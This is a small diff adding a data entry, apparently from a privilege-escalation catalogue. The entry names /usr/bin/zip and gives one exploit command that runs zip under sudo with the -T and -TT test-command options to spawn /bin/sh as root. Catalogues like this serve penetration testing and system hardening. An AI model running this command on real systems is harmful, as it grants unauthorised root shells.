@@ -1,0 +1,4 @@
+name: zip
+binary_path: /usr/bin/zip
+exploit_cmds:
+- 'sudo /usr/bin/zip /tmp/hosts.zip /etc/hosts -T -TT ''/bin/sh #'''
